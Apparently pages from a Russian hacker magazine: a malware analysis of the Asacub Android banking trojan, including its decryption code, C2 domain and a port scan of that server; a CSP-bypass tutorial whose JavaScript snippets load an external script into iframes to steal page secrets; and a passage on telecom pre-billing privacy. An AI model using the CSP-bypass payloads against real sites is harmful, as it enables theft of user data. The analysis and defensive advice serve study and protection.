         ВСКРЫВАЕМ МАЛВАРЬ ASACUB,
              КОТОРАЯ ВОРУЕТ ДЕНЬГИ
              У ПОЛЬЗОВАТЕЛЕЙ ANDROID




За пос ледний месяц нашумевший вирус Asacub заразил
более 200 тысяч пользователей Android. Он прилетел прямо
ко мне в руки. Поп робуем вместе заг лянуть в его сердце
и найти хозяина.


Как показывает статистика, в России на сегодняшний день 70% мобильных
устройств работают на Android. Среди наиболее распространенных вари‐
антов атак на них: блокировка устройства с требованием выкупа, кибершпи‐
онаж и кража денег с банковских карт и счетов. Поскольку у каждого ува‐
жающего себя банка есть мобильное приложение для Android, неудивитель‐
но, что их пользователи ста новятся мишенями для злоумышленников.


ЗАРАЖЕНИЕ
Итак, одним холодным осенним вечером ко мне на телефон поступает сооб‐
щение: «Вам пришло уведомление mms: fotowy.me/84rt от Оксана». Совер‐
шенно очевидно, что это вирус, потому что с Оксаной я давно не общаюсь.
Конечно же, мно гим извес тно, что любые ссылки в сообщениях — это зло.
Мне стало интересно, кто решил взломать мой BlackBerry и кто вообще
сегодня на это ведется.
  После перехода по ссылке открывается страница с предложением пос‐
мотреть фотографию той самой Оксаны.





                      Стра ница fotowy.me/84rt

Некогда размышлять — нажимаем! Сра зу же начина ется скачивание файла
photo_34778_img.apk. Как нас просят на сайте, раз решаем установку
с неизвестных источников и устанавливаем apk. Вот как выглядит приложение
«СМС‐фото». В том, что фотография вдруг оказалась приложением, конечно,
нет ничего странного.





                  Иконка приложения «СМС‐фото»

Но мы все еще не увидели фотографию Оксаны! Нам ведь очень хочется ее
посмотреть, поэтому запус каем «СМС‐фото», и наконец‐то Оксана предстает
перед нами во всей красе! Или нет. Никакой фотографии так и не вышло, при‐
ложение исчезло из спис ка, в уведомлениях появи лось «Системное приложе‐
ние».





                Уведомление «Системное приложение»

Через несколько секунд появляется окно «Системная неполадка». Звучит
страшно.





                  Окно «Сис темная неполадка»

Нажимаем «Перейти к нас тройкам». И соглашаемся «Use Сис темное при‐
ложение».





                Окно «Use Сис темное приложение»

Установленное приложение банка сразу замечает что‐то неладное (в отличие
от нас).





                Уведомление от приложения Сбербанка

Пытаемся запустить его, но оно тут же закрывается.





                  Окно с сооб щением о вирусе

Оказывается, это никакая не фотография, а банковский троян Asacub! Анти‐
вирусы говорят то же самое.


        WWW

                     Проверка на VirusTotal



Некоторые принципы работы Asacub уже были рассмотрены в иссле довании
«Лаборатории Касперского». Увы, множество людей не в курсе элементарной
безопасности Android. Asacub заражает в день более 40 тысяч смартфонов.
   Вот наиболее распростра ненные сооб щения для заражения:
 • «Юзернейм, посмотри фотографию по ссылке»;
 • «Юзернейм, тебе пришло MMS‐сообщение от Васи»;
 • «Юзернейм, интересует обмен Авито?»;
 • «Юзернейм, и тебе не стыдно пос ле этого?!».

А теперь без шуток попробуем посмотреть подробнее, что за зверь Asacub.


СТАТИЧЕСКИЙ АНАЛИЗ. ДЕКОМПИЛИРУЕМ ВИРУС
Инстру мен ты: Android Studio, JaDX
   Статический анализ включает в себя декомпиляцию приложений и прос‐
мотр исходного кода для дальнейшего анализа действий вируса. Сначала
воспользуемся JaDX для декомпиляции apk. Час то исходники могут быть кри‐
выми, но для анализа это го дос таточно. Ска чиваем и устанавливаем.


$ ls ‐l
$ git clone https://github.com/skylot/jadx.git
$ cd jadx
$ ./gradlew dist

Запускаем графический JaDX.


$ ls ‐l
$ cd build/jadx/
$ bin/jadx‐gui lib/jadx‐core‐*.jar

Выбираем File → Open → photoimg.apk. Видим исходники.





                      Исходники в JaDX

Но удобнее работать с ними в Android  Studio. Сохраня ем как проект
и импортируем в Android Studio. Пробежимся по AndroidManifest.xml. Смотрим
права приложения.


<uses‐permission android:name="android.permission.READ_CONTACTS"/>
<uses‐permission android:name="android.permission.SEND_SMS"/>
<uses‐permission android:name="android.permission.READ_SMS"/>
<uses‐permission android:name="android.permission.WRITE_SMS"/>
<uses‐permission android:name="android.permission.RECEIVE_SMS"/>
<uses‐permission android:name="android.permission.RECEIVE_BOOT_CO
MPLETED"/>
<uses‐permission android:name="android.permission.WAKE_LOCK"/>
<uses‐permission android:name="android.permission.READ_PHONE_STATE"/>
<uses‐permission android:name="android.permission.INTERNET"/>
<uses‐permission android:name="android.permission.CALL_PHONE"/>
<uses‐permission android:name="com.android.alarm.permission.SET_AL
ARM"/>
<uses‐permission android:name="android.permission.BIND_ACCESSIBIL
ITY_SERVICE"/>

Хоть они и оче видны для тех, кто понимает английский язык, пройдемся
по ним.
 • READ_CONTACTS — чтение адресной книги.
 • SEND_SMS, READ_SMS, WRITE_SMS, RECEIVE_SMS — отправка, чтение,
   редактирование, получение SMS.
 • RECEIVE_BOOT_COMPLETED —  получение информации о включении
   устройства для автозапус ка.
 • WAKE_LOCK — отключение спящего режима.
 • READ_PHONE_STATE — получение информации об устройстве.
 • INTERNET — доступ в интернет.
 • CALL_PHONE — осущест вление звонков.
 • SET_ALARM — использование будильника (для совершения периодичес‐
   ких действий).
 • BIND_ACCESSIBILITY_SERVICE — для мониторинга событий в системе,
   запуска приложений, нажатий кнопок и про чего.

Посмотрим некоторые действия.


<activity android:name="com.bacon.accident.Hypothesize" android:
showWhenLocked="true" android:turnScreenOn="true"/>

В Hypothesize.java находится код, который вызывает окно «Перейти к нас‐
тройкам».


<service android:name="com.bacon.accident.DespiseFar" android:permis
sion="android.permission.BIND_JOB_SERVICE" android:exported="true"/>

В DespiseFar.java — планирование  задач с помощью  JobScheduler.
Используется для задания времени выполнения функции, отсрочки.


<receiver android:name="com.bacon.accident.King" android:permission=
"android.permission.BROADCAST_SMS">
  <intent‐filter>
    <action android:name="android.provider.Telephony.SMS_DELIVER"/>
    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
    <action android:name=".STATUS"/>
  </intent‐filter>
</receiver>

В King.java собственно получение и обработка SMS. Также Asacub парсит
контакты для дальнейшей отправки им SMS.





                       Парсинг кон тактов

Все данные, отправляемые на сервер, и строки в приложении шифруются.
На сервер отправляется информа ция о телефоне, контакты. С сервера при‐
ходят команды для выполнения, номера для отправки SMS и тексты сооб‐
щений.





                     Зашифрованные строки

Дешифровка строк находится в f.java.


class f {
  private static final byte[] a = "8c70b3a3965".getBytes();
  private final byte[] b;
  f() {
    this.b = new byte[256];
    c(a);
  }
  f(String str) {
    this.b = new byte[256];
    c(str.getBytes());
  }
  private static f a(int i, int i2, int i3) {
    return new f("b32a67497e88");
  }
  static String a(String str) {
    return new String(a(7, 6, 5).b(str.getBytes()));
  }
  private void c(byte[] bArr) {
    int i;
    int i2 = 0;
    int length = bArr.length;
    byte[] bArr2 = new byte[256];
    for (i = 0; i < 256; i++) {
      this.b[i] = (byte) i;
      bArr2[i] = bArr[i % length];
    }
    i = 0;
    while (i2 < 256) {
      i = ((i + this.b[i2]) + bArr2[i2]) & 255;
      byte b = this.b[i];
      this.b[i] = this.b[i2];
      this.b[i2] = b;
      i2++;
    }
  }
  byte[] a(byte[] bArr) {
    int i = 0;
    byte[] bArr2 = new byte[bArr.length];
    int i2 = 0;
    int i3 = 0;
    while (i < bArr.length) {
      i3 = (i3 + 1) & 255;
      i2 = (i2 + this.b[i3]) & 255;
      byte b = this.b[i2];
      this.b[i2] = this.b[i3];
      this.b[i3] = b;
      bArr2[i] = (byte) (this.b[(this.b[i3] + this.b[i2]) & 255] ^
bArr[i]);
      i++;
    }
    return bArr2;
  }
  byte[] b(byte[] bArr) {
  return a(Base64.decode(bArr, 0));
  }
}

Видимо, используется Base64, но не будем пытать ся дешифровать руками.
Скопируем f.java в новый проект, запустим и выведем в консоль дешиф‐
рованную строку a.


String a = f.a("bQVMCZTJ8RucwuWP+ncPVMRzIkv9g/PXCauYXscZme2gUQL/
3VmxUkOhO4Hj4EyFm4W7I3eO1wr9ZdxOhgiqbF1ox5veD9G3hJPy21Oo4UrF6xPBkefFD
RSqI9Efyqp9HZVWDuOhz4WREtF558SOMI99GRBgj9kYMdxdJfJ+XHuiRro2V0E9Qy3
rTels0lLRFT48xvL2KAKEpfaKbtZdxXwW+PFvn7r3Wy6XMK03n2m2c0PLMjHz3HvKWl
ZW1Dz5V1JzSYb6ck/SfT4eJJouna07iNY2ZpWsJAGvQc46hPJwIDVzu3Ofs6yv/e0iECN
hzsnrxX3gWu0Qoh8Lfc0apwy1g8/3DVykz1q6udXbdsYXUuORaRKkmKL07b/iAqHSs
NvpoOPsknRB");
System.out.print(a);

Вывелся наш текст.



                    Дешифрованная строка


ДИНАМИЧЕСКИЙ АНАЛИЗ. ДЕБАЖИМ ВИРУС
Инстру мен ты: Genymotion, Android Studio, Wireshark, Nmap
  Код может быть обфусцирован, и тог да при статичес ком анализе у нас
возникнут трудности. В таких случаях на помощь приходит динамический ана‐
лиз. Суть его в том, что мы будем изучать вирус в процессе исполне ния при‐
ложения.
   Готовим инструменты. Android Studio — для дебага. Genymotion — эму‐
лятор для запуска apk. Wireshark — для ана лиза тра фика и пакетов, переда‐
ваемых вирусом. Я разместила все вмес те на экране, чтобы было видно
одновременно и трафик, и процессы.





                    Подготов ка инс трументов

Устанавливаем приложение на наш эмулятор. Запускаем и смотрим, что
говорит Android Studio.
  Первым делом приложение хочет отпра вить SMS на номер 900 с тек‐
стом 502. Как говорится на сайте Сбер банка, отправка SMS с чис лом —
это пополнение баланса телефо на на ука занную сумму. Для чего это может
быть нужно? Вероятно — проверка на бомжа, есть ли счет в Сбербанке и есть
ли на нем какие‐то деньги.



                   Сообщение на номер 900

После этого вирус начал стучать на свой сервер.





                Перехваченный трафик в Wireshark

Дальше запускается окно «Перейти к настройкам».



            Лог запуска кода для окна «Перейти к настройкам»

Видим, что приложение объявляет себя при ложением для работы с SMS.





            Уведомление об изменении приложения SMS app

И сразу начинает отправлять сообщения на неизвестные номера, одновре‐
менно отчитываясь на свой админский сервер.



                     От правка сооб щения 1



                     От правка сооб щения 2


КОМАНДНЫЙ ЦЕНТР
Посмотрим теперь, куда отстукивает Asacub и перед кем отчитывается. Ана‐
лизируя пакеты в Wireshark, видим, что Asacub отправляет запросы POST
с зашифрованным телом на адрес http://whiteonapple.com.





                 Пакет POST‐запроса в Wireshark

Что нам говорит WHOIS про этот домен?


Domain Name: WHITEONAPPLE.COM
Registrar WHOIS Server: whois.ordertld.com
Updated Date: 2018‐08‐23T18:08:07

Домен зарегистрирован 23 августа 2018 года. Существу ет уже больше
месяца. Посмотрим теперь, что нам скажет сервер самого хозяина (!) Asacub.
Узнаем, какие порты открыты на нем, чтобы рас познать ОС и используемые
сервисы. Просканируем все его порты с помощью Nmap (в нашем случае
ZenMap).





                     Вывод ZenMap 1





                     Вывод ZenMap 2

Что нам говорит вывод? На командном центре вируса стоит Debian и nginx.
80‐й порт, скорее всего, нужен для получения отклика от ботов. На 443‐м
порте, который используется для HTTPS, стоит сертификат для http://
vcdetfva5gnzbtby.onion. И на парочке портов еще есть HTTP. Скорее все‐
го, там и находится админка, билдер Asacub. Тяжело смотреть на админку,
в которую не можешь зайти. Но на этом наши пол номочия заканчиваются,
как и наше рассле дование.


ЧТО В ИТОГЕ?
Сорок тысяч заражений каждый день банковским вирусом Asacub, который
умеет:
 • отправлять информацию об устройстве, в том числе спис ка контактов;
 • управлять приложениями в телефо не;
 • отправлять SMS на номера с командного центра либо со списка контактов
   с именем кон такта в тексте и предложением перейти по ссылке;
 • читать SMS и отправлять содержимое в командный центр.

Человек переходит по ссылке, уста навливает вирус. С помощью социальной
инженерии Asacub заставляет пользователя выдать доступ к «Специальным
возможностям». И все. Дальше начинается рас пространение вируса друзьям
и отправка SMS на банковские номера, а с их помощью выполняется перевод
на карты и счета мошенников.
  Серверы с командным центром спо кой но работают уже больше месяца.
В целом убытки от киберпреступнос ти по ста тистике к 2021 году составят
около 6 триллионов долларов. Хочет ся задать ся вопросом: почему наш
любимый Роскомнадзор бло кирует Telegram, порносайты и все остальное
подряд миллионами, вместо того что бы заб локировать десять серверов,
которые при носят огромные убытки жителям стра ны? Получается, что о нас
никто не позаботится, а авторам Asacub разрешено обворовывать ежед‐
невно 40 тысяч человек.
  Ни в коем случае нельзя забывать об элементарных правилах безопас‐
ности, иначе из друга и помощника Android может стать сообщником грабите‐
лей и выдать доступ к банковским счетам, фотографиям и любой персональ‐
ной информации. Вряд ли кто‐то из читателей попадется на такую удочку,
но при случае не забывай информировать менее подкованных знакомых
и близких!
 ВЗЛОМ





                      Bo0oM
                       Security researcher, whitehat,
                    bug bounty practicant, blog‐
                            ger, noob, script kiddie
                          @i_bo0om

РАЗРЕШЕНО
ВСЕ! ИЗУЧАЕМ НОВУЮ КРУТУЮ
  ТЕХНИКУ ОБХОДА CSP




 Политика защиты контента (CSP) — это механизм, встро‐
 енный в браузеры, который позволяет защититься от XSS‐
  атак. Он описывает бра узеру безопасные источники заг‐
 рузки ресурсов, таких как JavaScript, стили, изображения,
 фреймы. Основной способ использования полити ки — бло‐
 кировка недоверенных JS, что сводит к минимуму веро‐
 ятность  успешной  эксплуатации  XSS.  Например,  если
 в заголов ке CSP указано загружать изображения только
 с текущего домена, то все теги со сто ронними доменами
 будут проигнорированы. Но как про вести полноценную атаку
 с кражей данных, если ничего нельзя отправлять на другие
 ресурсы?


  Типичный пример использования CSP — это разрешение загрузки ресурсов
  с собственного домена (self) и раз решение выполнения инлайн‐сценариев:


  Content‐Security‐Policy: default‐src 'self' 'unsafe‐inline';

  Такая политика подразумевает «зап рещено все, что не разрешено». В данной
  конфигурации будет запрещено любое исполь зование функций, выпол‐
  няющих код в виде строки, таких как eval, setTimeout, setInterval, так
  как отсутствует настройка 'unsafe‐eval'.





  Запрещено грузить любой контент с внешних источни ков, в том числе изоб‐
  ражения, CSS, WebSocket. И конечно же, JS.


         WWW

                       Для примера я специально оставил XSS в этом
                       месте, задача — украсть сек рет пользователя.


 Но не стоит забывать, что self поз воляет работать в контексте SOP в рамках
  этого домена, поэто му мы по‐прежнему можем грузить сценарии, создавать
  фреймы, изображения. Если вспомнить о фреймах, то CSP распространяется
  и на фреймы, в том чис ле если в качестве протокола будет указан data, blob
  или будет сформирован фрейм с помощью атрибута srcdoc.





            WARNING

                          Статья написана в исследовательских целях. Вся
                      информация в ней носит ознакомительный харак‐
                             тер. Ни автор, ни редак ция не несет ответствен‐
                         ности за неп равомерное использование упомяну‐
                         тых в ней аппаратных плат форм, программ и тех‐
                            ник!



 МОЖНО ЛИ ВЫПОЛНИТЬ JS В ТЕКСТОВОМ ФАЙЛЕ?
  Для начала вспомним один трюк. Если современный браузер открывает изоб‐
  ражение или какой‐то тексто вый файл, он автоматически преобразуется
  в HTML‐страницу.





  Это нужно для корректного отображения содержимого пользователю, чтобы
  у изображения был фон и она была рас положена по центру. Но iframe также
  является окном! Поэто му открытые в нем файлы, которые отображаются
  в браузере, например favicon.ico или robots.txt, авто матически преобразуются
  в HTML, независимо от того, корректные ли в нем данные, главное — чтобы
  был правильный content‐type.
    Но что, если фрейм будет содержать стра ницу сайта, но уже без заголовка
 CSP? Вопрос риторический. Выполнит ли открытый фрейм без политики все
  JS, которые будут у него внутри? Если иметь XSS на странице, мы можем
  сами записать свой JS внутрь фрейма.
    Для теста сфор мируем сценарий, который открывает iframe. Для примера
  возьмем bootstrap.min.css, путь к которому ука зан на странице выше.


  frame=document.createElement("iframe");
  frame.src="/css/bootstrap.min.css";
  document.body.appendChild(frame);





  Теперь посмотрим на содержимое фрей ма. Отлично! CSS был преобразован
  в HTML, и нам удалось переписать содержимое head (хотя оно было пустое).
  Теперь проверим, сработа ет ли в нем подключение внешнего JavaScript‐фай‐
  ла.


  script=document.createElement('script');
  script.src='//bo0om.ru/csp.js';
  window.frames[0].document.head.appendChild(script);





  Таким образом мы можем выполнить инъ екцию через iframe, соз дать в нем
  свой JS‐сценарий и обра титься в окно‐родитель, чтобы украсть оттуда дан‐
  ные.
    Для полноценной экс плуатации XSS дос таточно открыть фрейм с любым
  путем, где отсутствует политика безопасности. Это могут быть стандартные
  favicon.ico, robots.txt, sitemap.xml, CSS/JS‐файлы, загруженные пользовате‐
  лями изображения и прочее.


         WWW

                      PoC проведения атаки через robots.txt.




 ОШИБКИ СЕРВЕРА ДЛЯ ОБХОДА CSP
 Но что, если любой кор ректный ответ (200 — OK) содержит X‐Frame‐Options:
  Deny? Вторая ошибка, которую допус кают при внедрении CSP, — это отсутс‐
  твие защитных заголовков при ошибках веб‐сервера. Самый простой вари‐
  ант — обратиться на несуществующую страницу. Я заметил, что многие
  ресурсы ставят X‐Frame‐Options только на ответы 200, но 404 игнорируют.
    Если и это предусмотрено — попробуем вызвать стандартное сообщение
  от веб‐сервера о некорректной ссылке.
    Чтобы гарантированно выз вать 400 bad request на при мере nginx, дос‐
  таточно обратиться на директорию выше с помощью конструкции /%2e%2e%2f
   . Чтобы препятствовать нормализации ссылки бра узе ром (браузер убе рет
  /../ и отправит /), делаем urlencode точки и последнего слеша:


  frame=document.createElement("iframe");
  frame.src="/%2e%2e%2f";
  document.body.appendChild(frame);





  Другой из вариантов развития событий — переда ча некорректного urlencode
  в пути, например /% или /%%z.
    Однако самый простой способ получить ошиб ку веб‐сервера — это пре‐
 вышение длины URL. Современные бра узеры могут сфор мировать ссылку
  много больше, чем поддерживает веб‐сервер. А у веб‐серверов по умол‐
  чанию размер ссылки не должен превышать 8 Кбайт данных, как в nginx, так
  и в Apache.
    Для  этого вызываем похожий  сценарий,  например  с  длиной  пути
  в 20 000 байт:


  frame=document.createElement("iframe");
  frame.src="/"+"A".repeat(20000);
  document.body.appendChild(frame);





  Если вспомнить о других лимитах — это длина кук. Количество и длина кук
  в браузере может быть больше, чем поддерживают веб‐серверы. По ана‐
  логии:
   1. Создаем огромные cookie:


     for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};

   2. Открываем фрейм на любой адрес, сервер вернет ошибку (и часто
    без XFO и CSP).
   3. Удаляем огромные cookie:


     for(var i=0;i<5;i++){document.cookie=i+"="}

   4. Пишем в фрейм свой JS‐сценарий, который вору ет secret.

  Попробуй сам! А если не получится, вот тебе PoC :).
    Скорее всего, есть и другие способы вызвать ошибку, например отпра‐
  вить слишком длинный POST‐запрос или вызвать ошибку самого веб‐при‐
  ложения (например, с ошибкой 500).

 Почему это работа ет?
 Потому что политика подключаемого ресурса в фрейме кон тролируется
  самим ресурсом.



         WWW

                      На сайте Useless CSP ты найдешь множество
                        примеров сайтов, на которых неверно настроена
                          CSP, что сводит всю защиту на нет.



 КАК ЭТОГО ИЗБЕЖАТЬ
  Заголовок Content‐Security‐Policy должен присутс твовать на всех страницах,
  даже на ошибках веб‐сервера.
    Настройка CSP дол жна происхо дить таким обра зом, чтобы права были
  минимально необходимыми для корректной работы ресурса, если это воз‐
  можно. Попробуй включить Content‐Security‐Policy‐Report‐Only:  de‐
  fault‐src 'none' и постепен но включать правила для тех или иных ситу‐
  аций.
    Если для кор ректной работы ресурса необ ходимо использовать unsafe‐
  inline, обязательно нуж но внедрить nonce или hash‐source, без этого
  защита от атак типа XSS сходит на нет. А если CSP не защищает от атак, какой
  в нем смысл?


              INFO

                     Дополнительно, как рассказал @majorisc, данные
                         со страницы можно увести с помощью RTCPeer‐
                     Connection, передавая сек рет через DNS‐зап‐
                         росы. Default‐src  'self',  к сожалению,
                        не защищает и от это го.
ПРИВАТНОСТЬ
ПРЕД

                                                                         CuboZoa
                                                                                  kuzdima2@gmail.comБИЛЛИНГ
РАЗБИРАЕМСЯ, КАК
МОБИЛЬНЫЕ ОПЕРАТОРЫ
ХРАНЯТ И ОБРАБАТЫВАЮТ
НАШИ ДАННЫЕ





Мобильные операторы получа ют массу данных и метадан‐
ных, по которым можно узнать очень мно гое о жиз ни отдель‐
но взятого абонен та. А поняв, как обрабатываются и как хра‐
нятся эти данные, ты сможешь отследить всю цепочку про‐
хождения информации от звонка до списания денег. Если же
говорить о модели внутреннего нарушителя, то здесь воз‐
можности и подав но огромные, ведь защита данных вообще
не входит в задачи систем предбиллинга.


Для начала нужно учитывать, что або нентский трафик в сети телеком‐опе‐
ратора генерируется и поступа ет с раз ного оборудования. Это оборудование
может формировать файлы с запися ми (файлы CDR, логи RADIUS, текст
в ASCII) и работать по раз ным протоколам (NetFlow, SNMP, SOAP). И нужно
контролировать весь этот веселый и недружный хоровод, снимать данные,
обрабатывать и переда вать дальше в биллинговую систему в формате,
который будет предварительно стандартизован.
   При этом везде бегают або нентские данные, доступ к которым желательно
не предоставлять посторонним. Насколько защищена информация в такой
системе с учетом всех цепочек? Давай раз бирать ся.


ЗАЧЕМ ПРЕДБИЛЛИНГ ТЕЛЕКОМ-ОПЕРАТОРАМ?
Считается, что або ненты хотят получать все более новые и современные
виды услуг, но нельзя постоянно менять для это го оборудование. Поэтому
реализацией новых услуг и спо собами их предос тавления дол жен заниматься
предбиллинг — это его первая задача. Вторая — анализ трафика, проверка
его корректности, пол ноты загрузки в абонентский биллинг, подготовка дан‐
ных для биллинга.
  С помощью предбиллинга реализова ны раз личные сверки и дозагрузки
данных. Например, сверка сос тояния услуг на оборудовании и в биллинге.
Бывает, абонент пользует ся услугами при том, что в биллинге он уже заб‐
локирован. Либо он пользовался услугами, но с оборудования не поступили
записи об этом. Ситуаций может быть множество, большинство таких момен‐
тов и решается с помощью предбиллин га.
   Когда‐то я писал курсовую работу по оптимиза ции биз нес‐процессов
компании и расчету ROI. Проблема с рас четом ROI была не в том, что не было
исходных данных, — я не понимал, какой «линейкой» их мерить. Примерно так
же часто бывает с предбиллингом. Можно бесконечно настраивать и улуч‐
шать обработку, но всегда в какой‐то момент обсто ятельства и данные сло‐
жатся так, что произой дет исключение. Можно идеально выстроить сис тему
работы и мониторинга вспо могательных систем биллинга и предбиллинга,
но невозможно обеспечить бесперебойную работу оборудования и каналов
передачи данных.
   Поэтому и существует дуб лиру ющая система, которая занимается провер‐
кой данных в биллинге и данных, ушедших от предбиллинга в биллинг. Ее
задача — поймать то, что ушло с обо рудования, но по какой‐то при чине «не
легло на абонен та». Эту роль дублирующей и контролирующей предбиллинг
системы обычно играет FMS — Fraud Management System. Конечно, ее
основное предназначение — вовсе не контроль предбиллинга, а выявление
мошеннических схем и, как следс твие, мониторинг потерь и рас хождений
данных с оборудования и биллинго вых данных.
   На самом деле вариантов использования предбиллинга очень много. Нап‐
ример, это может быть выполнение сверки между состоянием абонента
на оборудовании и в CRM. Такая схема может выглядеть следующим обра‐
зом.
 1. С помощью предбиллинга по SOAP получа ем данные с оборудования
   (HSS, VLR, HLR, AUC, EIR).
 2. Преобразуем исходные RAW‐данные в нуж ный формат.
 3. Делаем запрос в смежные системы CRM (базы данных, программные
   интерфейсы).
 4. Производим сверку данных.
 5. Формируем записи‐исключения.
 6. Делаем запрос в систему CRM на син хронизацию данных.
 7. Итог — абонент, кача ющий фильм в роуминге в ЮАР, блокируется
   с нулевым балансом и не уходит в дикий минус.

Еще один пример использования — накопление данных и дальнейшая их
обработка. Такой вариант возможен, когда у нас тысячи записей с оборудо‐
вания (GGSN‐SGSN, телефония): выбрасывать все эти записи в детализацию
абонента — полнейшее безумие, не говоря уже о том, что мы адски нагружа‐
ем все системы таким количеством мел ких данных. По этой причине подойдет
следующая схема, которая разрешает проблему.
 1. Получение данных с обо рудования.
 2. Агрегация дан ных на предбиллинге (ждем, когда соберутся все нужные
   записи по какому‐либо усло вию).
 3. Отправка дан ных в конечный биллинг.
 4. Итог — вместо 10 тысяч записей мы отправили одну с агре гиру ющим зна‐
   чением счетчика потребленного интернет‐тра фика. Сделали всего один
   запрос к базе данных и сэкономили кучу ресурсов, включая электричес тво!

Это всего лишь типовые схемы работы. Формат статьи не позволя ет привес‐
ти примеры более сложных схем (нап ример, Big Data), но они тоже встре‐
чаются.


КАК УСМИРИТЬ ЗООПАРК?
Чтобы было понятнее, как это работа ет и где здесь могут воз никнуть проб‐
лемы, давай возьмем систему предбиллин га Hewlett‐Packard Internet Usage
Manager (HP IUM, в обновлен ном вари анте eIUM) и на ее примере пос‐
мотрим, как работает подобный софт.
   Представь большую мясорубку, в которую бросают мясо, овощи, буханки
хлеба — все, что только можно. То есть на вхо де самые разные продукты,
но на выходе все они приобретают одинаковую форму. Мы можем поменять
решетку и получим на выходе другую форму, но принцип и путь обработки
наших продуктов останет ся прежний — шнек, нож, решетка. Это и есть клас‐
сическая схема предбиллинга: сбор, обработка и вывод данных. В пред‐
биллинге IUM звенья этой цепочки называ ются  encapsulator, aggregator
и datastore.
    Тут необходимо понимать, что на входе у нас дол жна присутс твовать пол‐
нота данных — некий минимальный объем информации, без которого даль‐
нейшая обработка бесполезна. При отсутствии какого‐то блока или эле мента
данных мы получаем ошиб ку или предупреждение, что обработка невоз‐
можна, так как операции не могут быть выполнены без этих данных.
   Поэтому очень важно, чтобы обо рудование формировало фай лы‐записи,
которые имели бы строго определенный и уста новленный производителем
набор и тип данных. Каждый тип оборудо вания — отдельный обработчик (кол‐
лектор), который работает только со своим форматом входных данных. Нап‐
ример, нельзя просто так взять и закинуть файл с оборудования CISCO PGW‐
SGW с интернет‐трафиком мобильных абонентов на коллектор, который
обрабатывает поток с обо рудования фиксированной связи Iskratel Si3000.
   Если мы так сделаем, то в лучшем случае получим исключение при обра‐
ботке, а в худшем у нас вста нет вся обработка конкретного потока, так
как обработчик‐кол лектор упадет с ошибкой и будет ждать, пока мы не решим
проблему с «битым» с его точки зрения файлом. Здесь можно заметить, что
все системы предбиллинга, как пра вило, критично воспринимают данные,
на обработку которых не был настро ен конкретный обработчик‐кол лектор.
   Изначально поток разобранных данных (RAW) формируется на уровне
энкапсулятора и уже здесь же может быть подвергнут преобразованиям
и фильтрации. Так дела ется, если нужно до схемы агре гации произвести
с потоком изме нения, которые должны быть в дальнейшем применены
ко всему потоку данных (когда он будет проходить через раз личные схе мы
агрегации).





Файлы (.cdr, .log и прочие) с записями об активности пользователей‐абонен‐
тов поступают как с локальных источников, так и с уда ленных (FTP, SFTP), воз‐
можны варианты работы и по другим протоко лам. Разбирает файлы парсер,
с помощью разных классов Java.
   Так как система предбиллинга в нормальном режиме работы не пред‐
назначена для хранения истории обра батываемых файлов (а их может быть
сотни тысяч в сутки), то после обработки файл на источнике удаляется.
По разным причинам файл не всегда может быть уда лен корректно. В резуль‐
тате бывает, что записи из файла обрабатываются повторно или с большим
опозданием (когда удалить файл получилось). Для предотвращения таких
дублей  существуют  механизмы  защиты:  про верка  на  дубли  файлов
или записей, проверка на время в записях и прочее.
  Одно из самых уязвимых мест здесь — это критичность к размеру данных.
Чем больше мы храним данных (в памяти, в базах данных), тем медленнее мы
обрабатываем новые данные, тем больше мы потребляем ресурсов и в итоге
все равно достигаем предела, пос ле которого вынуждены удалить старые
данные. Таким образом, для хранения этих метаданных обычно используются
вспомогательные БД (MySQL, TimesTen, Oracle и так далее). Соответс твенно,
получаем еще одну сис тему, которая влияет на работу предбиллинга
с вытекающими вопросами безопас ности.


ЧТО В ЧЕРНОМ ЯЩИКЕ?
Когда‐то на заре подобных систем использовались языки, которые поз‐
воляли эффективно работать с регулярными выражениями, — таким, нап‐
ример, был Perl. Фактически почти весь предбиллинг, если не брать во вни‐
мание работу с внешними системами, — это пра вила разбора‐преобразова‐
ния строк. Естественно, лучше регулярных выражений тут ничего не найти.
Постоянно растущий объем данных и повышение критичности к вре мени
вывода новой услуги на рынок сделали применение таких систем невоз‐
можным, так как тестирова ние и внесение изменений занимало много вре‐
мени, масштабируемость была низкой.
   Современный предбиллинг — это набор модулей, как правило написан‐
ных  на  Java,  которыми мож но  управлять  в  гра фическом интерфейсе
с помощью стан дартных операций копирования, вставки, перемещения,
перетаскивания. Работа в этом интерфейсе прос та и понятна.
   Для работы в основном используется операционная сис тема на базе Linux
или Unix, реже — Windows.
   Основные  проб лемы  обычно  связаны  с  процес сом  тестирования
или выявления ошибок, так как данные проходят по множеству цепочек пра‐
вил и обогащаются данными из других систем. Видеть, что происходит с ними
на каждой стадии, не всегда удобно и понятно. Поэтому приходится искать
причину, отлавливая изменения нужных переменных при помощи логов.





Слабость этой системы — ее слож ность и человеческий фактор. Любое
исключение провоцирует потерю данных или неправильное их формирова‐
ние.
  Обрабатываются данные пос ледова тельно. Если на входе у нас ошиб‐
ка‐исключение, которая не позволяет корректно принять и обработать дан‐
ные, встает весь входной поток либо порция некорректных данных отбра‐
сывается. Разобранный RAW‐поток поступает на следующую стадию — агре‐
гацию. Схем агрегации может быть нес коль ко, и они изолированы друг
от друга. Как если единый поток воды, поступающий в душ, пройдя через
решетку лейки, разделится на раз ные потоки — одни толстые, другие совсем
тонкие.
   После агре гации данные готовы к доставке пот ребителю. Доставка может
идти как напрямую в базы данных, так и записью в файл и отправкой его даль‐
ше либо просто записью в хра нилище предбиллинга, где они будут лежать,
пока его не опустошат.
   После обра ботки на первом уровне данные могут передаваться на второй
и далее. Такая лестни ца необходима для увеличения скорости обработки
и распределения нагрузки. На второй ста дии к нашему потоку данных может
добавляться другой поток, смешиваться, делиться, копироваться, объеди‐
няться и так далее. Конечная стадия — это всегда доставка данных в сис‐
темы, которые его потребляют.
  В задачи предбиллинга не входит (и это пра вильно!):
 • мониторить, поступили и доставлены ли входные‐выходные данные, —
   этим должны заниматься отдельные системы;
 • шифровать данные на любой ста дии.

Далеко не весь поток пос тупа ющих данных подверга ется обработке. Обра‐
батываются только те данные, которые нужны для работы. Тратить время
на остальные нет смысла до того момента, пока они не понадобятся. Таким
образом, из RAW‐потока нужно брать только то, что нужно для схем агре‐
гации. Из RAW (текстовые файлы, результаты запросов, бинарные файлы)
парсится только необ ходимое.


ПРИВАТНОСТЬ
Здесь у нас полный расколбас! Начнем с того, что в задачи предбиллинга
не входит защита данных в принципе. Разгра ничение доступа к предбиллингу
нужно и возможно на раз ных уровнях (интерфейс управления, операционная
система), но если мы зас тавим его занимать ся шифрованием данных, то
